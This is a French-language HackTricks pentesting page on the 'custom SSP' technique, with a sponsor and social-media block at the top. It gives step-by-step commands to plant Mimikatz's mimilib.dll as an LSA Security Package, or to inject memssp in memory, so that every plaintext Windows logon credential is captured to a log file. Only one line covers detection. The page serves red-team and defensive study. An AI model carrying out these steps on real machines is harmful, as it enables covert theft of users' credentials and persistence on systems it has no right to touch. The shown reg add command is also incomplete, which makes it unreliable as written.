<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersécurité? Voulez-vous voir votre entreprise annoncée dans HackTricks? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# SSP personnalisé

[Apprenez ce qu'est un SSP (Security Support Provider) ici.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
Vous pouvez créer votre propre SSP pour **capturer** en **clair** les **informations d'identification** utilisées pour accéder à la machine.

### Mimilib

Vous pouvez utiliser le binaire `mimilib.dll` fourni par Mimikatz. **Cela enregistrera dans un fichier toutes les informations d'identification en clair.**\
Déposez la dll dans `C:\Windows\System32\`\
Obtenez une liste des packages de sécurité LSA existants:

{% code title="attaquant@cible" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
    Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Ajoutez `mimilib.dll` à la liste des fournisseurs de support de sécurité (Security Packages) :
```csharp
PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Et après un redémarrage, toutes les informations d'identification peuvent être trouvées en clair dans `C:\Windows\System32\kiwissp.log`

### En mémoire

Vous pouvez également injecter cela en mémoire directement en utilisant Mimikatz (notez que cela peut être un peu instable / ne pas fonctionner):
```csharp
privilege::debug
misc::memssp
```
Cela ne survivra pas aux redémarrages.

## Atténuation

ID d'événement 4657 - Audit de la création/modification de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
